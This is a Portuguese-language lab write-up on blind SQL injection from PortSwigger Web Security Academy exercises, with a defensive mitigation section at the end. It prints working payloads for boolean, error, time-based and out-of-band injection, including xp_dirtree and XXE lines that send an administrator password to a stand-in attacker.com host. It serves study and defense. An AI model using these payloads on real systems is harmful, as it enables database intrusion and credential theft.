# 💉 Blind SQL Injection – PortSwigger Web Security Academy

## 📋 Informações Gerais

| Item | Detalhe |
|------|----------|
| **Plataforma** | PortSwigger Web Security Academy |
| **Categoria** | Injeção de Código |
| **Nível de Dificuldade** | Practitioner |
| **Status** | ✅ 3/3 Laboratórios Concluídos |
| **Data** | Junho 2026 |
| **Ferramentas** | Burp Suite, Intruder, Interactsh |

---

## 🎯 Objetivo do Laboratório

Dominar técnicas avançadas de SQL Injection quando não há retorno de dados direto, incluindo exploração por comportamento condicional, delays de tempo e canais out-of-band (OAST).

---

## 📖 Resumo Executivo

Blind SQL Injection é mais difícil que SQLi tradicional porque:
- Sem erro SQL visível
- Sem retorno de dados na resposta
- Sem diferença óbvia de comportamento

Mas exploração **ainda é possível** através de:
1. **Boolean-based** — diferenças sutis de resposta
2. **Time-based** — delays artificiais
3. **OAST (DNS/HTTP)** — requisições externas

---

## 📚 Conceitos Teóricos

### O que é Blind SQL Injection?

Ocorre quando:
- Aplicação **é vulnerável** a SQLi
- Mas **não retorna dados** em resposta
- E **não exibe erros** SQL úteis

Isso impede técnicas como `UNION SELECT` tradicionais.

### Canais de Inferência

1. **Resposta da Aplicação** (boolean-based)
   - Condicional verdadeira → Comportamento A
   - Condicional falsa → Comportamento B

2. **Tempo de Resposta** (time-based)
   - Injetar SLEEP(5) se condição for verdadeira
   - Observar delay

3. **Interações Externas** (OAST)
   - DNS: `SELECT * FROM password WHERE 1=1; exec xp_dirtree '\\attacker.com\\a'`
   - HTTP: Aplicação faz requisição para servidor atacante

---

## 🧪 Técnicas Exploradas

### 1. Conditional-Based Blind SQLi

**Exemplo básico**:
```sql
TrackingId=abc' AND '1'='1
-- ✅ Resultado: resposta normal ("Welcome back")

TrackingId=abc' AND '1'='2
-- ❌ Resultado: comportamento diferente
```

**Extração de dados (caractere por caractere)**:
```sql
TrackingId=abc' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1)='s'
-- Se resposta = "Welcome back", primeiro caractere é 's'
-- Se resposta diferente, tentar próximo caractere
```

**Impacto**: Brute force lento mas confiável de senhas.

---

### 2. Error-Based Blind SQLi

**Conceito**: Explorar mensagens de erro para inferir dados.

```sql
-- Usar CASE para forçar erro
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
-- Erro = condição verdadeira
-- Sem erro = condição falsa

-- Exfiltração via erro (CAST)
CAST((SELECT password FROM users) AS int)
-- Força erro contendo dados sensíveis em mensagem
```

**Impacto**: Extração direta sem brute force.

---

### 3. Time-Based Blind SQLi

**Conceito**: Usar delays para observar condições.

**SQL Server**:
```sql
IF (1=1) WAITFOR DELAY '0:0:10'
-- Aplicação demora 10 segundos = condição verdadeira
```

**MySQL**:
```sql
SELECT SLEEP(10) WHERE 1=1
-- Similar ao SQL Server
```

**Extração baseada em tempo**:
```sql
IF (SUBSTRING(password, 1, 1)='s') WAITFOR DELAY '0:0:10'
-- Se delay, primeiro caractere é 's'
```

**Impacto**: Exploração sem retorno visível de dados.

---

### 4. Out-of-Band (OAST) SQL Injection

**Conceito**: Quando não há resposta visível, usar requisições externas.

**DNS Interaction (SQL Server)**:
```sql
'; exec master..xp_dirtree '//attacker.com/a'--
-- Força DNS lookup para attacker.com
```

**OAST Data Exfiltration**:
```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
-- Senha é enviada como subdomínio DNS
-- attacker.com recebe: S3curePassword.attacker.com
```

**Oracle + XXE (Avançado)**:
```sql
x' UNION SELECT EXTRACTVALUE(
  xmltype('<!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://attacker.com/">
    %remote;
  ]>'), '/l'
) FROM dual--
```

**Impacto**: Extração de dados mesmo sem resposta ou erro.

---

### 5. Evolução das Técnicas

```
🔹 Nível 1 — Visível
   UNION SELECT
   ✅ Retorno de dados direto

🔹 Nível 2 — Blind Boolean
   AND '1'='1 / AND '1'='2
   ⏱️ Lento, precisa brute force

🔹 Nível 3 — Error-Based
   CASE WHEN / CAST
   ⚡ Mais rápido, mas requer erros

🔹 Nível 4 — Time-Based
   WAITFOR DELAY / SLEEP
   ⏳ Muito lento, mas confiável

🔹 Nível 5 — OAST (DNS/HTTP)
   xp_dirtree / EXTRACTVALUE
   🌐 Mais poderoso, fora de banda
```

---

## 💥 Impacto Técnico

| Aspecto | Risco | Justificativa |
|---------|-------|---------------|
| **Confidencialidade** | 🔴 Alto | Acesso completo ao BD |
| **Integridade** | 🔴 Alto | Possível UPDATE/DELETE |
| **Disponibilidade** | 🟡 Médio | DoS via queries pesadas |
| **Privilégios Necessários** | Verde | Nenhum |
| **Tipo de Ataque** | Ativo | Requer múltiplas requisições |

---

## 🛡️ Mitigação & Defesa

### ✅ Defesa Completa

```python
# 🟢 Prepared Statements (Solução 1)
query = "SELECT password FROM users WHERE username = ?"
result = db.execute(query, (username,))

# 🟢 Input Validation (Solução 2)
def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Username inválido")
    return username

# 🟢 Principle of Least Privilege (Solução 3)
# User do BD tem apenas SELECT, não INSERT/UPDATE/DELETE

# 🟢 Error Handling (Solução 4)
try:
    result = db.execute(query, (username,))
except Exception as e:
    logger.error(f"DB Error: {e}")
    return "Erro ao processar solicitação"  # Mensagem genérica

# 🟢 Rate Limiting (Solução 5)
from flask_limiter import Limiter
limiter.limit("10 per minute")(login)
```

### Princípios de Defesa

- [x] Prepared Statements **sempre**
- [x] Input Validation (whitelist)
- [x] Least Privilege no banco
- [x] Mensagens de erro genéricas
- [x] Rate limiting
- [x] WAF/IDS
- [x] Logging e auditoría
- [x] Testes de segurança regulares

---

## 🎓 Lições Aprendidas

### Insight 1: Mentalidade Correta
Não é sobre **payloads**. É sobre **canais de inferência**:
- Resposta da aplicação
- Erros SQL
- Tempo de resposta
- Interações externas (DNS/HTTP)

### Insight 2: "Blind" Não Significa "Impossível"
Sem retorno direto, ainda há múltiplos caminhos para exploração.

### Insight 3: OAST é o Mais Poderoso
Porque:
- Funciona mesmo sem resposta
- Permite extração direta
- Difícil de bloquear completamente
- Prova de conceito inequívoca

### Insight 4: Velocidade vs Confiabilidade
- Time-based: **Confiável** mas **Lento**
- Boolean-based: **Rápido** mas **Frágil**
- OAST: **Melhor dos dois mundos**

---

## 🔗 Referências Completas

- **OWASP**: [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- **PortSwigger**: [SQL Injection](https://portswigger.net/web-security/sql-injection)
- **CWE**: [CWE-89 - SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- **HackTricks**: [Blind SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- **PayloadAllTheThings**: [Blind SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

**Autor**: Aislan Silva  
**Data de Conclusão**: Junho 2026  
**Status**: ✅ Documentado  
**Qualidade**: ⭐⭐⭐⭐⭐
